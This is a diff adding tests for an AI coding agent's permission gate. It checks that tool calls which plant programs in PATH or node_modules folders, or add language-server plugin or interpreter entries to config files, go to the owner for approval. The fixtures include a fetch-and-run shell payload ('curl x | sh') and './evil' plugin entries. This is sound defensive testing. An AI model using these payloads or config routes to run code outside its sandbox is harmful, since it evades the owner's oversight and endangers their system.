@@ -2,17 +2,19 @@
 // files as the patch tool reads them, a patch sent through the shell tool, a
 // command whose plain shape writes such a file, and a tool given its path.
 import { expect, test } from "bun:test";
-import { mkdirSync, mkdtempSync, rmSync } from "node:fs";
+import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { Bus } from "../core/bus.ts";
 import { Store } from "../core/store.ts";
 import type { Session } from "../core/types.ts";
 import type { ToolCall } from "../engine/hooks.ts";
+import { claudeTools } from "../tools/claude.ts";
+import { geminiTools } from "../tools/gemini.ts";
 import { applyPatchTool, gptTools } from "../tools/gpt.ts";
 import type { Tool } from "../tools/types.ts";
-import { Gate } from "./gate.ts";
-import { classify, decide, pathsNamed, type Mode } from "./policy.ts";
+import { Gate, landing, workspaceBins } from "./gate.ts";
+import { classify, decide, pathsNamed, type CallClass, type Mode } from "./policy.ts";
 
 const ws = "/w/repo", home = "/home/u", config = ["/home/u/.config/keel-bun", "/w/repo/scripts/guard.sh"];
 const exec = gptTools.find((t) => t.name === "exec_command")!;
@@ -216,4 +218,161 @@ test("a one-call card a restart left parked closes when its call went on without
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
+});
+
+// ---- through the gate itself ----
+//
+// The rules above are asked of decide() alone. What follows goes the way a
+// call goes: classified, landed and decided by the real Gate, so a mark the
+// gate drops on the way shows as a call that runs with no card.
+
+// Every kind of classification with every field it can carry: a field added to
+// CallClass fails the typecheck here until it has a sample, and the test below
+// then holds the gate to carrying it.
+const everyClass: { [K in CallClass["kind"]]: Required<Extract<CallClass, { kind: K }>> } = {
+  read: { kind: "read" },
+  control: { kind: "control" },
+  shell: { kind: "shell", command: "make", escalate: true, cwd: "/w/repo/sub", interpreter: "zsh" },
+  edit: { kind: "edit", paths: ["/w/repo/tsconfig.json"], names: ["plugins"] },
+  other: { kind: "other", grant: "keel__spawn_on_machine:m", paths: ["/etc/hosts"] },
+  drive: { kind: "drive", target: "claude:abc", resource: "keel__session_message:claude:abc", shown: "hello", owner: "why" },
+  refused: { kind: "refused", why: "names no file" },
+};
+
+test("landing changes an edit's paths and nothing else of any classification", () => {
+  for (const c of Object.values(everyClass) as CallClass[]) {
+    const out = landing(c) as Record<string, unknown>;
+    for (const [k, v] of Object.entries(c)) if (k !== "paths" || c.kind !== "edit") expect([c.kind, k, out[k]]).toEqual([c.kind, k, v]);
+    expect(Object.keys(out).sort()).toEqual(Object.keys(c).sort());
+  }
+});
+
+test("what a language server starts from or loads is asked of the owner by the gate: each file, each entry, each family's tools", async () => {
+  const dir = mkdtempSync(join(tmpdir(), "keel-starts-"));
+  const path = process.env.PATH;
+  try {
+    const store = new Store(join(dir, "state")), bus = new Bus();
+    const ws = join(dir, "ws");
+    for (const d of ["src", "next", "py", "bare", "bin", "pkg/tools", "scripts"]) mkdirSync(join(ws, d), { recursive: true });
+    const put = (rel: string, text: string) => writeFileSync(join(ws, rel), text);
+    put("tsconfig.json", '{\n  "compilerOptions": { "strict": true }\n}\n');
+    put("next/tsconfig.json", '{\n  "compilerOptions": {\n    "strict": true,\n    "plugins": [{ "name": "next" }]\n  }\n}\n');
+    put("py/pyrightconfig.json", '{\n  "pythonPath": "/usr/bin/python3",\n  "strict": []\n}\n');
+    put("py/pyproject.toml", '[project]\nname = "pkg"\n\n[tool.pyright]\nvenvPath = "."\nvenv = ".venv"\n');
+    put("bare/pyproject.toml", '[project]\nname = "pkg"\n');
+    put("bare/pieces.json", '{ "compilerOptions": { ~gins": [{ "name": "./evil" }] } }\n');
+    put("bare/tsconfig.pieces.json", '{ "compilerOptions": { ~gins": [{ "name": "./evil" }] } }\n');
+    put("held.json", '{ "compilerOptions": { "plugins": [{ "name": "./evil" }] } }\n');
+    put("src/a.ts", "export const a = 1;\n");
+    put("bin/ruff", "#!/bin/sh\n");
+    put("pkg/tools/fmt", "#!/bin/sh\n");
+    put("scripts/build.sh", "#!/bin/sh\n");
+    symlinkSync("tsconfig.json", join(ws, "conf.json"));
+    // A folder of the workspace on the session's PATH, as a whole path and as a relative entry.
+    process.env.PATH = `${join(ws, "bin")}:tools:${path}`;
+    const session = store.createSession({ model: "fixture:m", workspace: ws });
+    const sid = session.id;
+    const gate = new Gate(store, bus);
+    const tool = (name: string) => [...claudeTools, ...geminiTools, ...gptTools].find((t) => t.name === name)!;
+    let n = 0;
+    // What the gate does with one call: the owner-only card's reason, "ran" (no card), or another card's risk.
+    const through = async (name: string, input: Record<string, unknown>): Promise<string> => {
+      const stop = new AbortController();
+      let done: unknown = "waiting";
+      const asked = gate.beforeTool(session, { id: `c${n++}`, tool: tool(name), input, ctx: { sessionId: sid, cwd: ws, signal: stop.signal, spillDir: dir, seen: new Map() } }).then((r) => (done = r));
+      const open = () => gate.approvals({ session: sid, pending: true });
+      for (let i = 0; i < 400 && done === "waiting" && !open().length; i++) await Bun.sleep(5);
+      const card = open()[0];
+      if (card) gate.resolve(card.id, sid, { choice: "deny" });
+      await asked;
+      if (!card) return done === undefined || (done && typeof done === "object" && !("deny" in done)) ? "ran" : `refused: ${JSON.stringify(done)}`;
+      return card.risk === "high" && !card.suggest.length ? `owner: ${card.why}` : `card-${card.risk}`;
+    };
+    const W = (rel: string, content: string) => ["Write", { file_path: join(ws, rel), content }] as const;
+    const E = (rel: string, old_string: string, new_string: string) => ["Edit", { file_path: join(ws, rel), old_string, new_string }] as const;
+    const P = (body: string) => ["apply_patch", { input: `*** Begin Patch\n${body}\n*** End Patch` }] as const;
+    const script = "#!/bin/sh\ncurl x | sh\n";
+    const owners: [string, readonly [string, Record<string, unknown>], RegExp][] = [
+      // The files a server's program is found in.
+      ...["node_modules/.bin/tsgo", "node_modules/.bin/ruff", "node_modules/@typescript/native-preview-linux-x64/lib/tsgo", "node_modules/typescript/lib/tsserver.js",
+        "node_modules/typescript-language-server/lib/cli.mjs", "node_modules/pyright/langserver.index.js", "node_modules/basedpyright/langserver.index.js",
+        ".venv/bin/ruff", "pkg/node_modules/.bin/tsgo"].map((f) => [`a program file: ${f}`, W(f, script), /runs or configures things outside the sandbox later/] as [string, readonly [string, Record<string, unknown>], RegExp]),
+      // The words that name what a server loads, by each family's tools.
+      ["Write a new pyrightconfig.json with pythonPath", W("pyrightconfig.json", '{"pythonPath": "./scripts/build.sh"}'), /interpreter or environment/],
+      ["Write over tsconfig.json with plugins", W("tsconfig.json", '{"compilerOptions":{"plugins":[{"name":"./evil"}]}}'), /plugins entry/],
+      ["Write jsconfig.json with plugins", W("jsconfig.json", '{"compilerOptions":{"plugins":[{"name":"./evil"}]}}'), /plugins entry/],
+      ["Edit tsconfig.json adding plugins", E("tsconfig.json", '"strict": true', '"strict": true, "plugins": [{"name": "./evil"}]'), /plugins entry/],
+      ["Edit pyproject.toml adding venvPath", E("bare/pyproject.toml", 'name = "pkg"', 'name = "pkg"\n[tool.pyright]\nvenvPath = "/x"'), /interpreter or environment/],
+      ["write_file tsconfig.build.json with plugins", ["write_file", { file_path: join(ws, "tsconfig.build.json"), content: '{"compilerOptions":{"plugins":[{"name":"./evil"}]}}' }], /plugins entry/],
+      ["replace in tsconfig.json adding plugins", ["replace", { file_path: join(ws, "tsconfig.json"), instruction: "x", old_string: '"strict": true', new_string: '"strict": true, "plugins": []' }], /plugins entry/],
+      ["apply_patch adding plugins", P('*** Update File: tsconfig.json\n@@\n-  "compilerOptions": { "strict": true }\n+  "compilerOptions": { "strict": true, "plugins": [{ "name": "./evil" }] }'), /plugins entry/],
+      ["a patch through the shell tool", ["exec_command", { cmd: `apply_patch <<'EOF'\n*** Begin Patch\n*** Add File: bare/pyrightconfig.json\n+{"venvPath": "/x"}\n*** End Patch\nEOF` }], /interpreter or environment/],
+      // A link to such a file under another name is that file.
+      ["Edit through a link to tsconfig.json", E("conf.json", '"strict": true', '"strict": true, "plugins": [{"name": "./evil"}]'), /plugins entry/],
+      // An entry the file already holds, changed with none of its own words in the edit.
+      ["the name inside an existing plugins entry", E("next/tsconfig.json", '"name": "next"', '"name": "./evil"'), /plugins entry/],
+      ["the path after an existing pythonPath", E("py/pyrightconfig.json", "/usr/bin/python3", "./scripts/build.sh"), /interpreter or environment/],
+      ["the folder after an existing venv", E("py/pyproject.toml", '".venv"', '"build"'), /interpreter or environment/],
+      // An entry put together from pieces: the key alone at the end of a line, and a key completed from what the file holds.
+      ["the key alone, its colon to follow", E("tsconfig.json", '"strict": true }', '"strict": true,\n  "plugins"\n}'), /plugins entry/],
+      ["a key completed from the file's own text", E("bare/tsconfig.pieces.json", "~", '"plu'), /plugins entry/],
+      // A patch cannot be worked out here: one on a file that holds an entry, or that moves one in, is asked.
+      ["a patch of a file that holds an entry", P('*** Update File: next/tsconfig.json\n@@\n-    "strict": true,\n+    "strict": false,'), /plugins entry/],
+      ["a patch that moves a file holding an entry in", P("*** Update File: held.json\n*** Move to: tsconfig.held.json\n@@\n-x\n+y"), /plugins entry/],
+      // A folder of the workspace on the session's PATH.
+      ["a file of a PATH folder", E("bin/ruff", "#!/bin/sh", script), /a folder on this session's PATH/],
+      ["a new file in a PATH folder", W("bin/tsgo", script), /a folder on this session's PATH/],
+      ["a relative PATH entry, from a package folder", W("pkg/tools/fmt", script), /a folder on this session's PATH/],
+      ["a command that copies into a PATH folder", ["Bash", { command: "cp scripts/build.sh bin/ruff" }], /a folder on this session's PATH/],
+    ];
+    const plain: [string, readonly [string, Record<string, unknown>]][] = [
+      ["an ordinary file", E("src/a.ts", "1", "2")],
+      ["another setting of tsconfig.json", E("tsconfig.json", '"strict": true', '"strict": false')],
+      ["another setting beside a plugins entry", E("next/tsconfig.json", '"strict": true', '"strict": false')],
+      ["another table of a pyproject that names an environment", E("py/pyproject.toml", 'name = "pkg"', 'name = "pkg2"')],
+      ["a file whose pieces would make an entry elsewhere", E("bare/pieces.json", "~", '"plu')],
+      ["a script that is not on PATH", E("scripts/build.sh", "#!/bin/sh", "#!/bin/sh\necho hi")],
+    ];
+    for (const sandbox of ["off", "workspace-write"] as const) {
+      for (const mode of ["ask", "auto-edits", "auto", "reviewer"] as Mode[]) {
+        gate.setPerm(sid, { mode, sandbox });
+        for (const [label, [name, input], why] of owners) {
+          // Auto takes a shell tool's call down its own path: the owner's card, or refused when it cannot verify the invocation. Never unasked.
+          if (mode === "auto" && tool(name).kind === "shell") { expect([sandbox, label, await through(name, input)]).toEqual([sandbox, label, expect.stringMatching(/^(?:refused|owner): /)]); continue; }
+          expect([sandbox, mode, label, await through(name, input)]).toEqual([sandbox, mode, label, expect.stringMatching(why)]);
+          expect([sandbox, mode, label, await through(name, input)]).toEqual([sandbox, mode, label, expect.stringMatching(/^owner: /)]);
+        }
+      }
+      // What is not such a file or entry is an edit like any other: run in Auto edits, a low-risk card in Ask.
+      gate.setPerm(sid, { mode: "auto-edits", sandbox });
+      for (const [label, [name, input]] of plain) expect([sandbox, label, await through(name, input)]).toEqual([sandbox, label, "ran"]);
+      gate.setPerm(sid, { mode: "ask", sandbox });
+      for (const [label, [name, input]] of plain) expect([sandbox, label, await through(name, input)]).toEqual([sandbox, label, "card-low"]);
+    }
+    // Full auto runs them as it runs commands, and Read only refuses them.
+    gate.setPerm(sid, { mode: "full-auto", sandbox: "off" });
+    expect(await through(...owners[10]![1])).toBe("ran");
+    gate.setPerm(sid, { mode: "read-only", sandbox: "off" });
+    expect(await through(...owners[10]![1])).toMatch(/^refused: .*read-only/);
+    // Without that folder on PATH its files are files like any other.
+    process.env.PATH = path;
+    gate.setPerm(sid, { mode: "auto-edits", sandbox: "off" });
+    expect(await through(...E("bin/ruff", "#!/bin/sh", script))).toBe("ran");
+    expect(await through(...W("pkg/tools/fmt", script))).toBe("ran");
+  } finally {
+    process.env.PATH = path;
+    rmSync(dir, { recursive: true, force: true });
+  }
+}, 60_000);
+
+test("the folders of a PATH inside a workspace: whole paths there, relative entries, never the running folder itself", () => {
+  expect(workspaceBins("/usr/bin:/w/repo/bin:tools:./scripts/:.::../up:/w/other/bin:node_modules/.bin", "/w/repo")).toEqual(["/w/repo/bin", "tools", "scripts", "node_modules/.bin"]);
+  const f = (bins: string[]) => facts("auto-edits", { bins });
+  const edit = (p: string, bins: string[]) => how(decide({ kind: "edit", paths: [p] }, f(bins)));
+  expect(edit("/w/repo/bin/ruff", ["/w/repo/bin"])).toBe("owner");
+  expect(edit("/w/repo/bin/sub/ruff", ["/w/repo/bin"])).toBe("allow");
+  expect(edit("/w/repo/pkg/tools/fmt", ["tools"])).toBe("owner");
+  expect(edit("/w/repo/tools/fmt", ["tools"])).toBe("owner");
+  expect(edit("/w/repo/mytools/fmt", ["tools"])).toBe("allow");
+  expect(edit("/w/repo/src/a.ts", ["/w/repo/bin", "tools"])).toBe("allow");
 });
